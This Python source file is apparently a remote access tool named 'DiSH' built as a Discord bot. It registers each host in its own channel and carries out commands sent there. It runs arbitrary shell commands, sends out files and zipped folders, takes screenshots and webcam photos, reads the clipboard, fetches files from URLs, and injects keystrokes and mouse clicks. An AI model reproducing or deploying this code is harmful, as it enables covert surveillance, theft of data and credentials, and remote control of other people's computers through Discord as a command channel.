import pyperclip
import asyncio
import functools
import os
import shutil
import socket
from discord.ext import commands
import subprocess
import sys
import jishaku
import time
import traceback
import webbrowser
from datetime import datetime
from io import BytesIO
import ast
import tempfile
import aiohttp
import discord
import pyautogui
import requests
from PIL import ImageGrab
import cv2
import simpleaudio
from pydub import AudioSegment

# Dirs and other useless stuff start here!

owner_ids = [int(x) for x in os.getenv("OWNER_IDS").split(",")]

pyautogui.PAUSE = 0.2

formatted_now = datetime.now().strftime("%d-%m-%Y %Y-%M-%S")

# DiSH variables start here!

guild_id: int = int(os.getenv("GUILD_ID"))
category_id: int = int(os.getenv("CATEGORY_ID"))
try:
    token: str = os.environ["TOKEN"]
except:
    traceback.print_exc()
    sys.exit("No token specified")

# Helper functions go here
def filetowav(ofn):
    wfn = ofn.replace(ofn.split(".")[-1],'wav') # take the extension and change it
    x = AudioSegment.from_file(ofn)
    x.export(wfn, format='wav') 
    
def insert_returns(body):
    # insert return stmt if the last expression is a expression statement
    if isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(body[-1].value)
        ast.fix_missing_locations(body[-1])

    # for if statements, we insert returns into the body and the orelse
    if isinstance(body[-1], ast.If):
        insert_returns(body[-1].body)
        insert_returns(body[-1].orelse)

    # for with blocks, again we insert returns into the body
    if isinstance(body[-1], ast.With):
        insert_returns(body[-1].body)

# Functions go here

async def press(client, message: discord.Message, args: str):
    keys = args.split(" ")
    for a in keys:
        pyautogui.press(a)
    await message.reply(f"Pressed {', '.join(keys)}")

async def restartDiSH(client, message, args):
    await message.channel.send("Reloading using DiSHLoader. If DiSH isn't running using DiSHLoader, it won't restart (RIP)")
    sys.exit(2)

async def play(client, message: discord.Message, args: str):
    """
    It plays the sound file that was attached to the message
    :param client: The client object
    :type client: RemoteClient
    :param message: discord.Message
    :type message: discord.Message
    :param args: str - The arguments passed to the command
    :type args: str
    """
    async with aiohttp.ClientSession() as session:
        async with session.get(message.attachments[0].url) as res:
            print(
                "Extension of file: " + message.attachments[0].filename.split(".")[-1]
            )

            with open(message.attachments[0].filename, "wb") as f:
                f.write(await res.read())
    await message.reply("Started encoding file to wav")
    filetowav(message.attachments[0].filename)
    await message.reply("Finished encoding file to wav")
    obj = simpleaudio.WaveObject.from_wave_file(".".join(message.attachments[0].filename.split(".")[:-1])+".wav")
    m = await message.reply("Playing audio...")
    ply = obj.play()
    ply.wait_done()
    await m.reply("Done playing!")
    os.remove(message.attachments[0].filename)
    os.remove(".".join(message.attachments[0].filename.split(".")[:-1])+".wav")

async def typewrite(client, message: discord.Message, args: str):
    pyautogui.typewrite(args)
    await message.reply(f"Typed {args}")

async def hotkey(client, message: discord.Message, args: str):
    keys = args.split(" ")
    for a in keys:
        pyautogui.keyDown(a)
    for a in reversed(keys):
        pyautogui.keyUp(a)
    await message.reply(f"Send hotkey with commands {', '.join(keys)}")


async def specialKeys(client, message: discord.Message, args: str):
    await message.reply("\n".join(pyautogui.KEY_NAMES))

async def cam(client:discord.Client, message:discord.Message, args:str):
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
        o = cv2.VideoCapture(0)
        s, img = o.read()
        del s
        cv2.imwrite(temp.name, img)
        await message.channel.send(file=discord.File(temp.name))
        o.release()
        temp.close()
        os.unlink(temp.name)

async def loc(client, message: discord.Message, args: str):
    if len(message.attachments) == 0:
        return await message.reply("No file specified")
    fileUrl = message.attachments[0].url
    res = requests.get(fileUrl, stream=True)
    with open(message.attachments[0].filename, "wb") as f:
        f.write(res.content)
        pos = pyautogui.locateOnScreen(message.attachments[0].filename, confidence=0.8)
        if pos == None:
            os.remove(message.attachments[0].filename)
            return await message.reply("Image not found :/")
        pyautogui.click(pos)
        await message.reply("Clicked at " + str(pos))
        await message.reply("No image found :/")
    os.remove(message.attachments[0].filename)


async def click(client, message: discord.Message, args: str):
    pos = args.split(" ")
    pyautogui.click(int(pos[0]), int(pos[1]))
    await message.reply("Clicked at " + str(pos))


def exec_command(command):
    """
    It executes a command and returns the output and error messages as a tuple.

    :param command: The command to be executed
    :return: A tuple of the stdout and stderr of the command.
    """

    executed = subprocess.run(command, capture_output=True, text=True, shell=True)
    return (executed.stdout, executed.stderr)


async def dump(client, message: discord.Message, args: str):
    """
    It takes a file or directory, and sends it to the channel.

    :param client:
    :type client: RemoteClient
    :param message: discord.Message
    :type message: discord.Message
    :param args: str
    :type args: str
    :return: The file is being returned.
    """
    if not os.path.exists(args):
        return await message.channel.send("Not existing-file")

    if os.path.isdir(args):
        executor = functools.partial(shutil.make_archive, args, "zip", args)
        await client.loop.run_in_executor(None, executor)
        return await message.channel.send(file=discord.File(args + ".zip"))

    with open(args, "rb") as fp:
        await message.channel.send(file=discord.File(fp))


async def screenshot(client, message: discord.Message, args: str):

    """
    It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
    command was sent in

    :param client: - The client that the command was called from
    :type client: RemoteClient
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    
    img = ImageGrab.grab(all_screens=True)
    byteio = BytesIO()
    img.save(byteio, format="PNG")
    byteio.seek(0)
    await message.channel.send(file=discord.File(byteio, "screenshot.png"))


async def cd(client, message: discord.Message, args: str):
    """
    It changes the directory to the one specified in the arguments.

    :param client: The discord client
    :type client: RemoteClient
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str - The arguments passed to the command
    :type args: str
    """
    os.chdir(args)
    await message.channel.send("Changed directory to " + args)


async def upload(client, message: discord.Message, args: str):
    """
    It downloads the file from the URL, and saves it to the specified location.

    :param client: - The client that the command was called from
    :type client: RemoteClient
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    file = message.attachments[0].url
    async with aiohttp.ClientSession() as session:
        async with session.get(file) as r:
            data = await r.read()
            with open(args, "wb") as fp:
                fp.write(data)
                await message.channel.send("Uploaded file to " + args)
                fp.close()
            r.close()
        await session.close()


async def download(client, message: discord.Message, args: str):

    """
    It downloads a file from a URL and saves it to a file.

    :param client: - The client that the command was sent from
    :type client: RemoteClient
    :param message: discord.Message = The message object that triggered the command
    :type message: discord.Message
    :param args: str = The arguments passed to the command
    :type args: str
    """
    url = args.split(" ")[0]
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as r:
            data = await r.read()
            with open(" ".join(args.split(" ")[1:]), "wb") as fp:
                fp.write(data)
                await message.channel.send(
                    "Downloaded file to " + " ".join(args.split(" ")[1:])
                )
                fp.close()
            r.close()
        await session.close()


async def edit(client, message: discord.Message, args: str):
    """
    It sends a message, sends a file, sends another message, waits for a message, writes the message
    content to the file, sends another message.

    :param client: the client object
    :type client: RemoteClient
    :param message: The message that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """
    await message.channel.send("Editing file " + args)
    try:
        await message.channel.send(file=discord.File(args))
    except:
        await message.channel.send("File does not exist :C")

    await message.channel.send("Send the new file content")
    try:
        file_content = await client.wait_for(
            "message", check=lambda m: m.author == message.author, timeout=120
        )
        f = open(args, "w")
        f.write(file_content.content)
        f.close()
        await message.channel.send("Edited file")
    except asyncio.TimeoutError:
        await message.channel.send("Too much time has passed :C")


async def pwd(client, message: discord.Message, args: str):

    """
    It sends a message to the channel the command was sent in, saying the current directory

    :param client: The client object
    :type client: RemoteClient
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """
    await message.channel.send(os.getcwd())


async def browser(client, message: discord.Message, args: str):
    """
    It opens a web browser and goes to the URL specified in the command.

    :param client: The client object
    :type client: RemoteClient
    :param message: The message object that triggered the command
    :type message: discord.Message
    :param args: str
    :type args: str
    """

    webbrowser.open(args)

async def help(client, message: discord.Message, args: str):
    modules = client.modules.values()
    docs = []
    print(iter(modules))
    for a in modules:
        try:
            docs.append(str(a.__name__ + " : "+ str(a.__doc__)))
        except:
            traceback.print_exc()
    print(docs)
    try:
        
        await message.channel.send("Available commands:\n"+"\n".join(docs))
    except:
        help_message = "Available commands\n"+"\n".join(docs)
        f = BytesIO(help_message.encode())
        await message.channel.send(file=discord.File(f, "output.txt"))

async def clipboard(client, message:discord.Message, args:str):
    
    await message.channel.send(pyperclip.paste())

# It's a discord client that connects to a specific guild and category, and has a dictionary of
# modules that can be called.
class RemoteClient(commands.Bot):
    def __init__(self, guild_id: int, category_id: int, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.guild_id: int = guild_id
        self.category_id: int = category_id
        self.hostname: str = socket.gethostname()
        self.channel = None
        self.modules = {
            "dump": dump,
            "cd": cd,
            "pwd": pwd,
            "browser": browser,
            "screenshot": screenshot,
            "upload": upload,
            "download": download,
            "edit": edit,
            "press": press,
            "typewrite": typewrite,
            "hotkey": hotkey,
            "special": specialKeys,
            "restartDish": restartDiSH,
            "loc": loc,
            "click": click,
            "cam":cam,
            "help":help,
            "clipboard":clipboard,
            "play": play
        }

    async def on_ready(self):
        await self.load_extension(jishaku.__name__)
        """
        It creates a channel with the name of the hostname and username of the user that launched the
        bot.
        """
        print(f"Logged in as {self.user}")
        guild: discord.Guild = self.get_guild(self.guild_id)
        category: discord.CategoryChannel = guild.get_channel(self.category_id)
        channel_name: str = (
            self.hostname.lower().replace(" ", "-").replace(".", "")
            + "-"
            + os.getlogin().lower().replace(" ", "-").replace(".", "")
        )
        channel = guild.get_channel(int(os.getenv("LOGS_ID")))
        for a in category.text_channels:
            if a.name == channel_name:
                self.channel = a
        if self.channel == None:
            self.channel = await guild.create_text_channel(
                channel_name, category=category
            )
        print(self.channel.name)
        await self.channel.send(
            f"Bot launched succesfully on PC {self.hostname} as {os.getlogin()}"
        )
        await channel.send(f"Bot launched on {self.hostname} as {os.getlogin()} on channel {self.channel.mention}")

    async def on_message(self, message: discord.Message):
        """
        It takes a message, splits it into a list of words, and then tries to execute the first word as a
        command. If it can't find the command, it executes the message as a command in the command line.

        :param message: The message object that triggered the event
        :type message: discord.Message
        :return: The return value is a tuple of two strings, the first being the stdout and the second being
        the stderr.
        """
        ctx = await self.get_context(message)
        if (ctx.valid):
            await self.process_commands(message)
            return

        if message.channel == self.channel or message.channel.id == int(
            os.getenv("GLOBAL_ID")
        ):
            if message.author.id == self.user.id:
                return
            parsed = message.content.split(" ")
            try:
                if len(parsed) > 1:
                    await self.modules[parsed[0]](self, message, " ".join(parsed[1:]))
                else:
                    await self.modules[parsed[0]](self, message, "")
            except KeyError:
                executor = functools.partial(exec_command, parsed)
                res = await self.loop.run_in_executor(None, executor)

                try:
                    if len(res[0]) > 0:
                        
                        await message.channel.send(f"Stdout: ```bat\n{res[0]}\n```")
                    if len(res[1]) > 0:
                        await message.channel.send(f"Stderr: ```bat\n{res[1]}\n```")
                except:
                    f = BytesIO(f"Stdout: {res[0]}\n\nStderr: {res[1]}```".encode())
                    await message.channel.send(file=discord.File(f, "output.txt"))

            except:
                traceback.print_exc()
                exc = traceback.format_exc()
                await message.channel.send(f"Python Errors: ```py\n{exc}\n```")
                if "SystemExit: 2" in exc:
                    sys.exit(2)


if __name__ == "__main__":
    connected = False
    while not connected:
        try:
            r = requests.get("https://discord.com")
            if r.status_code == 200:
                connected = True
            time.sleep(2)
        except:
            pass
        time.sleep(1)

    client = RemoteClient(guild_id, category_id, command_prefix=".", intents=discord.Intents.all(), owner_ids=owner_ids)
    client.run(token)
